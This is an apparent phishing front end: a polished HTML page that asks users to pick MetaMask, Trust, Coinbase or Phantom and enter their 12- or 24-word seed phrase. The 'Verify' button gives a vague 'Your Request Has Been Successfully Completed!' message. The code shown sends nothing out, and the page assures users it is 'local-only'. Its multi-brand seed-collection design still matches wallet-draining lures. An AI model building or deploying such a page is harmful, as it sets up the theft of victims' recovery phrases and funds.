<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>🔐 Crypto Wallet - Seed Phrase Input</title>

    <!-- Google Font for a clean look -->
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
        href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap"
        rel="stylesheet" />

    <!-- Font Awesome for icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />

    <style>
        /* ───────────── RESET & BASE ───────────── */
        *,
        *::before,
        *::after {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            background: #0b0e14;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1.5rem;
            background-image: radial-gradient(ellipse at 50% 0%, #1a2330 0%, #0b0e14 70%);
        }

        /* ───────────── CARD CONTAINER ───────────── */
        .wallet-card {
            max-width: 820px;
            width: 100%;
            background: #141b24;
            border-radius: 2rem;
            padding: 2rem 2rem 2.5rem;
            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(255, 255, 255, 0.04);
            transition: box-shadow 0.3s ease;
        }

        .wallet-card:hover {
            box-shadow: 0 30px 70px rgba(0, 0, 0, 0.9), 0 0 0 1px rgba(255, 255, 255, 0.06);
        }

        /* ───────────── HEADER ───────────── */
        .card-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 1.8rem;
            flex-wrap: wrap;
            gap: 0.75rem;
        }

        .card-header-left {
            display: flex;
            align-items: center;
            gap: 0.75rem;
        }

        .wallet-icon {
            width: 44px;
            height: 44px;
            background: linear-gradient(135deg, #f7931a, #ffb347);
            border-radius: 14px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.4rem;
            color: #0b0e14;
            box-shadow: 0 6px 16px rgba(247, 147, 26, 0.25);
            flex-shrink: 0;
        }

        .card-header h1 {
            font-size: 1.3rem;
            font-weight: 700;
            color: #f0f4fa;
            letter-spacing: -0.3px;
        }

        .card-header h1 span {
            font-weight: 400;
            color: #8899b0;
            font-size: 0.85rem;
            display: block;
            margin-top: 2px;
            letter-spacing: 0px;
        }

        .security-badge {
            display: flex;
            align-items: center;
            gap: 0.4rem;
            background: #1e2a36;
            padding: 0.4rem 1rem;
            border-radius: 40px;
            font-size: 0.7rem;
            font-weight: 600;
            color: #6d8a9e;
            letter-spacing: 0.3px;
            text-transform: uppercase;
            border: 1px solid #283440;
        }

        .security-badge i {
            color: #4ade80;
            font-size: 0.6rem;
        }

        /* ───────────── INFO BANNER ───────────── */
        .info-banner {
            background: #1a2632;
            border-radius: 1rem;
            padding: 0.9rem 1.2rem;
            margin-bottom: 1.8rem;
            display: flex;
            align-items: flex-start;
            gap: 0.75rem;
            border-left: 4px solid #f7931a;
        }

        .info-banner i {
            color: #f7931a;
            font-size: 1rem;
            margin-top: 0.1rem;
            flex-shrink: 0;
        }

        .info-banner p {
            font-size: 0.8rem;
            color: #b0c4db;
            line-height: 1.5;
            font-weight: 400;
        }

        .info-banner strong {
            color: #e8edf5;
            font-weight: 600;
        }

        /* ───────────── WALLET SELECTOR ───────────── */
        .wallet-selector {
            margin-bottom: 1.5rem;
        }

        .wallet-selector label {
            display: block;
            font-size: 0.8rem;
            font-weight: 500;
            color: #9aafc7;
            letter-spacing: 0.2px;
            margin-bottom: 0.6rem;
        }

        .wallet-options {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 0.6rem;
        }

        @media (max-width: 600px) {
            .wallet-options {
                grid-template-columns: repeat(2, 1fr);
            }
        }

        .wallet-option {
            background: #0f161e;
            border: 2px solid #1f2c3a;
            border-radius: 12px;
            padding: 0.8rem 0.5rem;
            text-align: center;
            cursor: pointer;
            transition: all 0.25s ease;
            color: #8899b0;
            font-size: 0.7rem;
            font-weight: 500;
            font-family: 'Inter', sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 0.3rem;
            position: relative;
        }

        .wallet-option:hover {
            border-color: #3d5167;
            background: #1a2632;
            transform: translateY(-2px);
        }

        .wallet-option.active {
            border-color: #f7931a;
            background: #1a2632;
            color: #f0f4fa;
            box-shadow: 0 0 0 3px rgba(247, 147, 26, 0.15), 0 4px 20px rgba(247, 147, 26, 0.1);
        }

        .wallet-option .wallet-icon-wrapper {
            width: 48px;
            height: 48px;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.8rem;
            margin-bottom: 0.2rem;
            transition: all 0.3s ease;
        }

        .wallet-option .wallet-name {
            font-size: 0.7rem;
            font-weight: 600;
            letter-spacing: 0.2px;
            line-height: 1.2;
        }

        .wallet-option .check-mark {
            display: none;
            position: absolute;
            top: -6px;
            right: -6px;
            background: #4ade80;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            display: none;
            align-items: center;
            justify-content: center;
            font-size: 0.6rem;
            color: #0b0e14;
            box-shadow: 0 2px 8px rgba(74, 222, 128, 0.4);
        }

        .wallet-option.active .check-mark {
            display: flex;
        }

        /* Individual wallet icon styles */
        .wallet-option[data-wallet="metamask"] .wallet-icon-wrapper {
            background: linear-gradient(135deg, #f6851b, #e2761b);
            color: white;
        }

        .wallet-option[data-wallet="trust"] .wallet-icon-wrapper {
            background: linear-gradient(135deg, #3375bb, #1a4d8a);
            color: white;
        }

        .wallet-option[data-wallet="coinbase"] .wallet-icon-wrapper {
            background: linear-gradient(135deg, #0052ff, #0038b3);
            color: white;
        }

        .wallet-option[data-wallet="phantom"] .wallet-icon-wrapper {
            background: linear-gradient(135deg, #ab9ff2, #7b6cd4);
            color: white;
        }

        .wallet-option.active .wallet-icon-wrapper {
            transform: scale(1.05);
            box-shadow: 0 4px 16px rgba(247, 147, 26, 0.2);
        }

        /* ───────────── WORD COUNT TOGGLE ───────────── */
        .word-count-toggle {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 1.5rem;
            flex-wrap: wrap;
            gap: 0.75rem;
        }

        .word-count-toggle label {
            font-size: 0.8rem;
            font-weight: 500;
            color: #9aafc7;
            letter-spacing: 0.2px;
        }

        .toggle-group {
            display: flex;
            background: #0f161e;
            border-radius: 40px;
            padding: 3px;
            border: 1px solid #1f2c3a;
        }

        .toggle-group button {
            background: transparent;
            border: none;
            padding: 0.4rem 1.2rem;
            border-radius: 30px;
            font-size: 0.75rem;
            font-weight: 600;
            color: #7a92aa;
            cursor: pointer;
            transition: all 0.25s ease;
            font-family: 'Inter', sans-serif;
        }

        .toggle-group button.active {
            background: #f7931a;
            color: #0b0e14;
            box-shadow: 0 4px 14px rgba(247, 147, 26, 0.3);
        }

        .toggle-group button:first-child.active {
            background: #f7931a;
        }

        .toggle-group button:hover:not(.active) {
            color: #d0def0;
        }

        /* ───────────── SEED GRID ───────────── */
        .seed-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 0.7rem;
            margin-bottom: 1.8rem;
        }

        @media (min-width: 600px) {
            .seed-grid {
                grid-template-columns: repeat(4, 1fr);
            }
        }

        @media (min-width: 768px) {
            .seed-grid {
                grid-template-columns: repeat(6, 1fr);
            }
        }

        .word-field {
            display: flex;
            align-items: center;
            background: #0f161e;
            border-radius: 10px;
            border: 1.5px solid #1f2c3a;
            transition: border-color 0.25s ease, box-shadow 0.25s ease;
            overflow: hidden;
        }

        .word-field:focus-within {
            border-color: #f7931a;
            box-shadow: 0 0 0 3px rgba(247, 147, 26, 0.15);
        }

        .word-field.error {
            border-color: #ef4444;
            box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.15);
        }

        .word-field .index {
            display: flex;
            align-items: center;
            justify-content: center;
            min-width: 26px;
            font-size: 0.55rem;
            font-weight: 700;
            color: #4a5f75;
            padding-left: 8px;
            user-select: none;
            letter-spacing: 0.3px;
        }

        .word-field input {
            flex: 1;
            background: transparent;
            border: none;
            padding: 0.6rem 0.5rem 0.6rem 0.2rem;
            font-size: 0.8rem;
            font-weight: 500;
            color: #e8edf5;
            outline: none;
            font-family: 'Inter', sans-serif;
            min-width: 0;
            width: 100%;
            letter-spacing: 0.2px;
        }

        .word-field input::placeholder {
            color: #3d5167;
            font-weight: 400;
            font-size: 0.7rem;
            letter-spacing: 0px;
        }

        .word-field input:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        /* ───────────── ACTIONS BAR ───────────── */
        .actions-bar {
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            gap: 0.7rem;
            margin-bottom: 1.5rem;
        }

        .actions-bar .btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
            padding: 0.6rem 1.2rem;
            border-radius: 40px;
            font-size: 0.78rem;
            font-weight: 600;
            font-family: 'Inter', sans-serif;
            border: none;
            cursor: pointer;
            transition: all 0.25s ease;
            background: #1f2c3a;
            color: #c8d9ed;
            flex: 1 1 auto;
            min-width: 100px;
        }

        .actions-bar .btn i {
            font-size: 0.85rem;
        }

        .actions-bar .btn:hover {
            background: #2a3a4c;
            color: #f0f4fa;
            transform: translateY(-1px);
        }

        .actions-bar .btn-primary {
            background: linear-gradient(135deg, #f7931a, #e07c0e);
            color: #0b0e14;
            box-shadow: 0 4px 16px rgba(247, 147, 26, 0.25);
        }

        .actions-bar .btn-primary:hover {
            background: linear-gradient(135deg, #ffa231, #f7931a);
            box-shadow: 0 6px 24px rgba(247, 147, 26, 0.35);
            transform: translateY(-2px);
            color: #0b0e14;
        }

        .actions-bar .btn-outline {
            background: transparent;
            border: 1.5px solid #2a3a4c;
            color: #9aafc7;
        }

        .actions-bar .btn-outline:hover {
            background: #1a2632;
            border-color: #3d5167;
            color: #e8edf5;
        }

        .actions-bar .btn-danger-outline {
            background: transparent;
            border: 1.5px solid #4a2a2a;
            color: #ef7a7a;
        }

        .actions-bar .btn-danger-outline:hover {
            background: #2a1a1a;
            border-color: #6a3a3a;
            color: #ff9a9a;
        }

        /* ───────────── STATUS & VALIDATION ───────────── */
        .status-area {
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 0.75rem;
            margin-top: 0.5rem;
            padding-top: 1.2rem;
            border-top: 1px solid #1a2632;
        }

        .status-message {
            display: flex;
            align-items: center;
            gap: 0.6rem;
            font-size: 0.8rem;
            font-weight: 500;
            color: #8899b0;
        }

        .status-message i {
            font-size: 0.9rem;
        }

        .status-message.valid {
            color: #4ade80;
        }

        .status-message.invalid {
            color: #ef4444;
        }

        .status-message .dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            display: inline-block;
            background: #3d5167;
        }

        .status-message.valid .dot {
            background: #4ade80;
        }

        .status-message.invalid .dot {
            background: #ef4444;
        }

        .word-counter {
            font-size: 0.7rem;
            font-weight: 500;
            color: #5a738b;
            letter-spacing: 0.3px;
        }

        .word-counter span {
            color: #b0c4db;
            font-weight: 600;
        }

        /* ───────────── TOAST / NOTIFICATION ───────────── */
        .toast {
            position: fixed;
            bottom: 2rem;
            left: 50%;
            transform: translateX(-50%) translateY(80px);
            background: #1e2a36;
            border: 1px solid #2a3a4c;
            padding: 0.8rem 1.8rem;
            border-radius: 50px;
            font-size: 0.85rem;
            font-weight: 500;
            color: #e8edf5;
            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.6);
            backdrop-filter: blur(12px);
            opacity: 0;
            pointer-events: none;
            transition: all 0.4s cubic-bezier(0.22, 1, 0.36, 1);
            display: flex;
            align-items: center;
            gap: 0.6rem;
            z-index: 999;
        }

        .toast.show {
            opacity: 1;
            transform: translateX(-50%) translateY(0);
            pointer-events: auto;
        }

        .toast i {
            font-size: 1rem;
        }

        .toast.success i {
            color: #4ade80;
        }

        .toast.error i {
            color: #ef4444;
        }

        .toast.info i {
            color: #60a5fa;
        }

        /* ───────────── RESPONSIVE TWEAKS ───────────── */
        @media (max-width: 480px) {
            .wallet-card {
                padding: 1.5rem 1rem 1.8rem;
                border-radius: 1.2rem;
            }

            .card-header h1 {
                font-size: 1.1rem;
            }

            .card-header h1 span {
                font-size: 0.7rem;
            }

            .seed-grid {
                grid-template-columns: repeat(3, 1fr);
                gap: 0.5rem;
            }

            .word-field input {
                font-size: 0.7rem;
                padding: 0.5rem 0.3rem;
            }

            .word-field .index {
                min-width: 20px;
                font-size: 0.5rem;
                padding-left: 5px;
            }

            .actions-bar .btn {
                font-size: 0.7rem;
                padding: 0.5rem 0.8rem;
                min-width: 70px;
            }

            .info-banner p {
                font-size: 0.7rem;
            }

            .status-area {
                flex-direction: column;
                align-items: flex-start;
                gap: 0.4rem;
            }

            .wallet-option .wallet-icon-wrapper {
                width: 40px;
                height: 40px;
                font-size: 1.4rem;
            }
        }

        @media (max-width: 380px) {
            .seed-grid {
                grid-template-columns: repeat(2, 1fr);
            }
        }

        /* ───────────── SCROLLBAR STYLING ───────────── */
        ::-webkit-scrollbar {
            width: 4px;
            height: 4px;
        }

        ::-webkit-scrollbar-track {
            background: #0f161e;
        }

        ::-webkit-scrollbar-thumb {
            background: #2a3a4c;
            border-radius: 10px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: #3d5167;
        }

        /* ───────────── SELECTION ───────────── */
        ::selection {
            background: #f7931a;
            color: #0b0e14;
        }

        /* ───────────── ANIMATION ───────────── */
        @keyframes pulse-dot {

            0%,
            100% {
                opacity: 1;
            }

            50% {
                opacity: 0.3;
            }
        }

        .pulsing-dot {
            animation: pulse-dot 1.8s ease-in-out infinite;
        }
    </style>
</head>

<body>

    <!-- ─── MAIN CARD ─── -->
    <div class="wallet-card">

        <!-- Header -->
        <div class="card-header">
            <div class="card-header-left">
                <div class="wallet-icon">
                    <i class="fas fa-key"></i>
                </div>
                <h1>
                    Seed Phrase
                    <span>Enter your recovery phrase</span>
                </h1>
            </div>
            <div class="security-badge">
                <i class="fas fa-lock"></i>
                <span>Encrypted</span>
            </div>
        </div>

        <!-- Info Banner -->
        <div class="info-banner">
            <i class="fas fa-shield-alt"></i>
            <p>
                <strong>Never share</strong> your seed phrase with anyone.
                This form is <strong>local-only</strong> — nothing is sent or stored.
            </p>
        </div>

        <!-- Wallet Selector -->
        <div class="wallet-selector">
            <label>Select Wallet</label>
            <div class="wallet-options" id="walletOptions">
                <button class="wallet-option active" data-wallet="metamask">
                    <span class="check-mark"><i class="fas fa-check"></i></span>
                    <div class="wallet-icon-wrapper">
                        <i class="fas fa-fox"></i>
                    </div>
                    <span class="wallet-name">MetaMask</span>
                </button>
                <button class="wallet-option" data-wallet="trust">
                    <span class="check-mark"><i class="fas fa-check"></i></span>
                    <div class="wallet-icon-wrapper">
                        <i class="fas fa-shield-halved"></i>
                    </div>
                    <span class="wallet-name">Trust Wallet</span>
                </button>
                <button class="wallet-option" data-wallet="coinbase">
                    <span class="check-mark"><i class="fas fa-check"></i></span>
                    <div class="wallet-icon-wrapper">
                        <i class="fas fa-building-columns"></i>
                    </div>
                    <span class="wallet-name">Coinbase Wallet</span>
                </button>
                <button class="wallet-option" data-wallet="phantom">
                    <span class="check-mark"><i class="fas fa-check"></i></span>
                    <div class="wallet-icon-wrapper">
                        <i class="fas fa-ghost"></i>
                    </div>
                    <span class="wallet-name">Phantom Wallet</span>
                </button>
            </div>
        </div>

        <!-- Word Count Toggle -->
        <div class="word-count-toggle">
            <label for="wordToggle">Number of words</label>
            <div class="toggle-group" id="wordToggle">
                <button class="active" data-count="12">12</button>
                <button data-count="24">24</button>
            </div>
        </div>

        <!-- Seed Grid -->
        <form id="seedForm" autocomplete="off" novalidate>
            <div class="seed-grid" id="seedGrid">
                <!-- Fields will be injected by JS -->
            </div>

            <!-- Actions -->
            <div class="actions-bar">
                <button type="button" class="btn btn-outline" id="pasteBtn">
                    <i class="fas fa-paste"></i> Paste
                </button>
                <button type="button" class="btn btn-danger-outline" id="clearBtn">
                    <i class="fas fa-eraser"></i> Clear
                </button>
                <button type="button" class="btn btn-primary" id="verifyBtn">
                    <i class="fas fa-check-circle"></i> Verify
                </button>
            </div>

            <!-- Status -->
            <div class="status-area">
                <div class="status-message" id="statusMsg">
                    <span class="dot"></span>
                    <span id="statusText">Ready</span>
                </div>
                <div class="word-counter">
                    Words: <span id="wordCountDisplay">0</span> / <span id="totalWordsDisplay">12</span>
                </div>
            </div>
        </form>
    </div>

    <!-- ─── TOAST ─── -->
    <div class="toast" id="toast">
        <i class="fas fa-info-circle"></i>
        <span id="toastMsg">Hello</span>
    </div>

    <!-- ──────────────────────────────────────────────── -->
    <!-- ─── JAVASCRIPT ────────────────────────────────── -->
    <!-- ──────────────────────────────────────────────── -->
    <script>
        (function () {
            'use strict';

            // ─── DOM refs ──────────────────────────────────────
            const grid = document.getElementById('seedGrid');
            const toggleBtns = document.querySelectorAll('.toggle-group button');
            const totalWordsSpan = document.getElementById('totalWordsDisplay');
            const wordCountSpan = document.getElementById('wordCountDisplay');
            const statusMsg = document.getElementById('statusMsg');
            const statusText = document.getElementById('statusText');
            const toast = document.getElementById('toast');
            const toastMsg = document.getElementById('toastMsg');

            const pasteBtn = document.getElementById('pasteBtn');
            const clearBtn = document.getElementById('clearBtn');
            const verifyBtn = document.getElementById('verifyBtn');

            const walletOptions = document.querySelectorAll('.wallet-option');

            // ─── State ─────────────────────────────────────────
            let wordCount = 12;
            let fields = [];
            let selectedWallet = 'metamask';

            // ─── Helpers ──────────────────────────────────────

            function showToast(message, type = 'info') {
                const iconMap = {
                    success: 'fa-check-circle',
                    error: 'fa-exclamation-circle',
                    info: 'fa-info-circle',
                };
                toast.className = 'toast';
                toast.querySelector('i').className = `fas ${iconMap[type] || iconMap.info}`;
                toastMsg.textContent = message;
                void toast.offsetWidth;
                toast.classList.add('show');
                clearTimeout(toast._timer);
                toast._timer = setTimeout(() => {
                    toast.classList.remove('show');
                }, 3000);
            }

            function setStatus(text, type = 'neutral') {
                const dot = statusMsg.querySelector('.dot');
                statusText.textContent = text;
                statusMsg.className = 'status-message';
                if (type === 'valid') {
                    statusMsg.classList.add('valid');
                } else if (type === 'invalid') {
                    statusMsg.classList.add('invalid');
                }
            }

            function updateWordCounter() {
                const filled = fields.filter(f => f.value.trim() !== '').length;
                wordCountSpan.textContent = filled;
                totalWordsSpan.textContent = wordCount;
            }

            function getWalletName(walletId) {
                const names = {
                    metamask: 'MetaMask',
                    trust: 'Trust Wallet',
                    coinbase: 'Coinbase Wallet',
                    phantom: 'Phantom Wallet'
                };
                return names[walletId] || walletId;
            }

            // ─── Build Grid ──────────────────────────────────

            function buildGrid(count) {
                wordCount = count;
                grid.innerHTML = '';
                fields = [];

                for (let i = 1; i <= count; i++) {
                    const wrapper = document.createElement('div');
                    wrapper.className = 'word-field';

                    const idxSpan = document.createElement('span');
                    idxSpan.className = 'index';
                    idxSpan.textContent = i;

                    const input = document.createElement('input');
                    input.type = 'text';
                    input.id = `word-${i}`;
                    input.placeholder = `#${i}`;
                    input.autocomplete = 'off';
                    input.spellcheck = false;
                    input.dataset.index = i;

                    input.addEventListener('input', function () {
                        this.closest('.word-field').classList.remove('error');
                        updateWordCounter();
                        setStatus('Ready', 'neutral');
                    });

                    input.addEventListener('blur', function () {
                        const val = this.value.trim();
                        if (val && /\s/.test(val)) {
                            this.value = val.replace(/\s+/g, ' ');
                            showToast('Word cannot contain spaces', 'error');
                            this.closest('.word-field').classList.add('error');
                        }
                    });

                    wrapper.appendChild(idxSpan);
                    wrapper.appendChild(input);
                    grid.appendChild(wrapper);
                    fields.push(input);
                }

                totalWordsSpan.textContent = count;
                updateWordCounter();
                setStatus('Ready', 'neutral');

                toggleBtns.forEach(btn => {
                    btn.classList.toggle('active', parseInt(btn.dataset.count) === count);
                });
            }

            // ─── Actions ──────────────────────────────────────

            function pasteSeed() {
                navigator.clipboard.readText()
                    .then(text => {
                        const words = text.trim().split(/\s+/).filter(w => w.length > 0);
                        if (words.length === 0) {
                            showToast('Clipboard is empty', 'error');
                            return;
                        }
                        if (words.length > wordCount) {
                            showToast(`Too many words (${words.length}). Need ${wordCount}.`, 'error');
                            return;
                        }
                        fields.forEach((input, idx) => {
                            if (idx < words.length) {
                                input.value = words[idx];
                            } else {
                                input.value = '';
                            }
                            input.closest('.word-field').classList.remove('error');
                        });
                        updateWordCounter();
                        setStatus('Pasted successfully', 'valid');
                        showToast(`Pasted ${words.length} words`, 'success');
                    })
                    .catch(() => {
                        showToast('Unable to read clipboard. Please paste manually.', 'error');
                    });
            }

            function clearSeed() {
                fields.forEach(input => {
                    input.value = '';
                    input.closest('.word-field').classList.remove('error');
                });
                updateWordCounter();
                setStatus('Cleared', 'neutral');
                showToast('All fields cleared', 'info');
            }

            function verifySeed() {
                const filled = fields.filter(f => f.value.trim() !== '');
                const total = fields.length;

                if (filled.length === 0) {
                    setStatus('No words entered', 'invalid');
                    showToast('Please enter your seed phrase', 'error');
                    return;
                }

                if (filled.length < total) {
                    setStatus(`Missing ${total - filled.length} word(s)`, 'invalid');
                    showToast(`Please fill all ${total} words`, 'error');
                    fields.forEach((input) => {
                        const wrapper = input.closest('.word-field');
                        if (input.value.trim() === '') {
                            wrapper.classList.add('error');
                        } else {
                            wrapper.classList.remove('error');
                        }
                    });
                    return;
                }

                const walletName = getWalletName(selectedWallet);
                setStatus(`✅ ${walletName} - Your Request Has Been Successfully Completed!`, 'valid');
                showToast(`${walletName} - Your Request Has Been Successfully Completed!`, 'success');

                fields.forEach((input) => {
                    input.closest('.word-field').classList.remove('error');
                });
            }

            // ─── Wallet Selection ─────────────────────────────

            function selectWallet(walletId) {
                selectedWallet = walletId;
                walletOptions.forEach(btn => {
                    btn.classList.toggle('active', btn.dataset.wallet === walletId);
                });
                const walletName = getWalletName(walletId);
                showToast(`${walletName} selected`, 'info');
                setStatus(`Wallet: ${walletName}`, 'neutral');
            }

            // ─── Init ──────────────────────────────────────────

            function init() {
                buildGrid(12);

                walletOptions.forEach(btn => {
                    btn.addEventListener('click', function () {
                        const walletId = this.dataset.wallet;
                        if (walletId === selectedWallet) return;
                        selectWallet(walletId);
                    });
                });

                toggleBtns.forEach(btn => {
                    btn.addEventListener('click', function () {
                        const count = parseInt(this.dataset.count);
                        if (count === wordCount) return;
                        const hasContent = fields.some(f => f.value.trim() !== '');
                        if (hasContent) {
                            if (!confirm(`Switching to ${count} words will clear the current input. Continue?`)) {
                                return;
                            }
                        }
                        buildGrid(count);
                        fields.forEach(f => f.closest('.word-field').classList.remove('error'));
                        setStatus('Ready', 'neutral');
                    });
                });

                pasteBtn.addEventListener('click', pasteSeed);
                clearBtn.addEventListener('click', clearSeed);
                verifyBtn.addEventListener('click', verifySeed);

                setTimeout(() => {
                    if (fields.length) fields[0].focus();
                }, 300);
            }

            if (document.readyState === 'loading') {
                document.addEventListener('DOMContentLoaded', init);
            } else {
                init();
            }

        })();
    </script>

</body>
